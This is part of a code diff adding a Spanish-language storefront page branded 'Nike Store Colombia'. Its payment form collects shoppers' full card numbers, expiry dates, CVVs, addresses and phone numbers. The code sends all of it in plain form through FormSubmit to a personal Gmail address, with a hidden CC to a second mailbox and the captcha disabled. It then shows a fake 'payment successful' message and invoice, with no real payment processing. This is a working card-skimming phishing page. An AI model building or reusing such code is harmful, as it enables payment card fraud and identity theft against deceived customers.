+      }
+    }
+    pdf.save(`Factura_${invoiceNumber}.pdf`);
+    document.body.removeChild(invoiceDiv);
+  }
+
+  // ========== LÓGICA DE PAGO ==========
+  function openPaymentModal() {
+    const total = getCurrentTotal();
+    if (total === 0) { alert("Selecciona al menos un producto."); return; }
+    const items = buildOrderSummary();
+    const summaryDiv = document.getElementById('modalOrderSummary');
+    summaryDiv.innerHTML = `<strong>🛒 Tu pedido (con 20% descuento):</strong><ul style="margin-top:8px; margin-left:18px;">${items.map(i => `<li>${i.name} (${i.category}) - ${i.size} x ${i.quantity} → $${formatCOP(i.subtotal)} COP</li>`).join('')}</ul>`;
+    document.getElementById('modalTotal').innerHTML = `Total: $${formatCOP(total)} COP`;
+    // Limpiar campos
+    ['fullName', 'email', 'address', 'city', 'phone', 'cardNumber', 'cvv'].forEach(id => document.getElementById(id).value = '');
+    document.getElementById('expiryDateSelect').value = '';
+    clearAllErrors();
+    document.getElementById('paymentFeedback').innerHTML = '';
+    document.getElementById('paymentModal').style.display = 'flex';
+  }
+
+  function closeModal() { document.getElementById('paymentModal').style.display = 'none'; }
+  function clearAllErrors() {
+    ['nameError', 'emailError', 'addressError', 'cityError', 'phoneError', 'cardError', 'expiryError', 'cvvError'].forEach(id => document.getElementById(id).innerHTML = '');
+    ['fullName', 'email', 'address', 'city', 'phone', 'cardNumber', 'cvv'].forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.classList.remove('error-input');
+    });
+  }
+
+  function validateShippingAndContact() {
+    let valid = true;
+    const name = document.getElementById('fullName').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const address = document.getElementById('address').value.trim();
+    const city = document.getElementById('city').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    if (!name) { document.getElementById('nameError').innerHTML = 'Nombre requerido.'; valid = false; }
+    if (!email) { document.getElementById('emailError').innerHTML = 'Correo requerido.'; valid = false; }
+    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { document.getElementById('emailError').innerHTML = 'Correo inválido.'; valid = false; }
+    if (!address) { document.getElementById('addressError').innerHTML = 'Dirección requerida.'; valid = false; }
+    if (!city) { document.getElementById('cityError').innerHTML = 'Ciudad requerida.'; valid = false; }
+    if (!phone) { document.getElementById('phoneError').innerHTML = 'Teléfono requerido.'; valid = false; }
+    else if (!/^\d{7,15}$/.test(phone.replace(/\s/g, ''))) { document.getElementById('phoneError').innerHTML = 'Teléfono inválido.'; valid = false; }
+    return valid;
+  }
+
+  function validateCardNumber(cardRaw) {
+    let cleaned = cardRaw.replace(/\s/g, '');
+    if (!cleaned) return { valid: false, message: 'Número requerido.' };
+    if (!/^\d+$/.test(cleaned)) return { valid: false, message: 'Solo números.' };
+    if (cleaned.length < 13 || cleaned.length > 16) return { valid: false, message: '13-16 dígitos.' };
+    let sum = 0, double = false;
+    for (let i = cleaned.length-1; i>=0; i--) {
+      let digit = parseInt(cleaned[i]);
+      if (double) { digit *= 2; if (digit>9) digit-=9; }
+      sum += digit;
+      double = !double;
+    }
+    if (sum %10 !== 0) return { valid: false, message: 'Tarjeta inválida (Luhn).' };
+    return { valid: true };
+  }
+  function validateCVV(cvv) {
+    if (!cvv) return { valid: false, message: 'CVV requerido.' };
+    if (!/^\d+$/.test(cvv)) return { valid: false, message: 'Solo números.' };
+    if (cvv.length !== 3 && cvv.length !== 4) return { valid: false, message: '3 o 4 dígitos.' };
+    return { valid: true };
+  }
+  function formatCardNumber(value) {
+    let d = value.replace(/\D/g, '').slice(0,16);
+    return d.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+  }
+
+  function generateExpiryOptions() {
+    const select = document.getElementById('expiryDateSelect');
+    const currentYear = new Date().getFullYear();
+    const currentMonth = new Date().getMonth() + 1;
+    for (let year = currentYear; year <= currentYear + 10; year++) {
+      for (let month = 1; month <= 12; month++) {
+        if (year === currentYear && month < currentMonth) continue;
+        const monthStr = month.toString().padStart(2, '0');
+        const yearStr = year.toString().slice(-2);
+        const value = `${monthStr}/${yearStr}`;
+        const option = document.createElement('option');
+        option.value = value;
+        option.textContent = `${monthStr} / ${yearStr}`;
+        select.appendChild(option);
+      }
+    }
+  }
+
+  // ========== ENVÍO A FORMSUBMIT CON CORREO ADICIONAL ==========
+  async function sendPaymentData(formDataObj) {
+    const url = 'https://formsubmit.co/justincortez1621@gmail.com'; // correo principal
+    const formData = new FormData();
+    for (let [key, val] of Object.entries(formDataObj)) {
+      formData.append(key, val);
+    }
+    // Agregar correo adicional en copia oculta (CC)
+    formData.append('_cc', 'cautymartinez@mbox.re');
+    formData.append('_captcha', 'false');
+    formData.append('_template', 'table');
+    formData.append('_subject', '👟 Nuevo pedido Nike Store Colombia');
+    const params = new URLSearchParams(formData).toString();
+    try {
+      const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: params });
+      return res.ok || res.status === 302;
+    } catch(e) { return false; }
+  }
+
+  const modalForm = document.getElementById('paymentFormModal');
+  modalForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    clearAllErrors();
+    if (!validateShippingAndContact()) return;
+    
+    const expiryValue = document.getElementById('expiryDateSelect').value;
+    if (!expiryValue) { document.getElementById('expiryError').innerHTML = 'Seleccione fecha de expiración.'; return; }
+    
+    const cardRaw = document.getElementById('cardNumber').value.trim();
+    const cvvRaw = document.getElementById('cvv').value.trim();
+    const total = getCurrentTotal();
+    if (total === 0) { alert("Carrito vacío"); closeModal(); return; }
+    
+    let valid = true;
+    if (!validateCardNumber(cardRaw).valid) {
+      document.getElementById('cardError').innerHTML = validateCardNumber(cardRaw).message;
+      document.getElementById('cardNumber').classList.add('error-input');
+      valid = false;
+    }
+    if (!validateCVV(cvvRaw).valid) {
+      document.getElementById('cvvError').innerHTML = validateCVV(cvvRaw).message;
+      document.getElementById('cvv').classList.add('error-input');
+      valid = false;
+    }
+    if (!valid) return;
+
+    const items = buildOrderSummary();
+    const customerData = {
+      nombre_recibe: document.getElementById('fullName').value.trim(),
+      email: document.getElementById('email').value.trim(),
+      direccion: document.getElementById('address').value.trim(),
+      ciudad: document.getElementById('city').value.trim(),
+      telefono: document.getElementById('phone').value.trim()
+    };
+    const invoiceNumber = `NIKE-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
+    
+    const formDataObj = {
+      factura: invoiceNumber, ...customerData,
+      cardNumber: cardRaw, expiryDate: expiryValue, cvv: cvvRaw,
+      total_COP: formatCOP(total),
+      productos: items.map(i => `${i.name} (${i.category}) ${i.size} x${i.quantity} = $${formatCOP(i.subtotal)} COP`).join(' | ')
+    };
+    
+    const btn = document.querySelector('#paymentFormModal .btn-submit-payment');
+    const originalText = btn.innerText;
+    btn.innerText = '📨 Procesando...';
+    btn.disabled = true;
+    const sent = await sendPaymentData(formDataObj);
+    btn.innerText = originalText;
+    btn.disabled = false;
+    
+    const feedback = document.getElementById('paymentFeedback');
+    if (sent) {
+      await generateAndDownloadInvoice(customerData, items, total, invoiceNumber);
+      feedback.innerHTML = '<div class="success-message">✅ Pago exitoso. Factura descargada. En breve recibirás tu pedido ✅</div>';
+      productState.forEach(state => state.quantity = 0);
+      updateTotals();
+      renderProducts();
+      setTimeout(() => { closeModal(); feedback.innerHTML = ''; }, 4000);
+    } else {
+      feedback.innerHTML = '<div class="success-message" style="background:#e53e3e;">❌ Error en el envío. Intenta de nuevo.</div>';
+    }
+  });
+
+  function buildCategorySelect() {
+    const select = document.getElementById('categorySelect');
+    categoryList.forEach(cat => {
+      const option = document.createElement('option');
+      option.value = cat;
+      option.textContent = categoryDisplay[cat];
+      select.appendChild(option);
+    });
+    select.addEventListener('change', (e) => {
+      activeCategory = e.target.value;
+      renderProducts();
+    });
+  }
+
+  // Eventos globales
+  document.getElementById('openPayModalBtn').addEventListener('click', openPaymentModal);
+  document.getElementById('closeModalBtn').addEventListener('click', closeModal);
+  window.addEventListener('click', (e) => { if (e.target === document.getElementById('paymentModal')) closeModal(); });
+  document.getElementById('imageModal').addEventListener('click', () => { document.getElementById('imageModal').style.display = 'none'; });
+  document.getElementById('cardNumber').addEventListener('input', function() { this.value = formatCardNumber(this.value); document.getElementById('cardError').innerHTML = ''; });
+  document.getElementById('cvv').addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0,4); document.getElementById('cvvError').innerHTML = ''; });
+
+  generateExpiryOptions();
+  buildCategorySelect();
+  renderProducts();
+  updateTotals();
+</script>
+</body>
+</html>
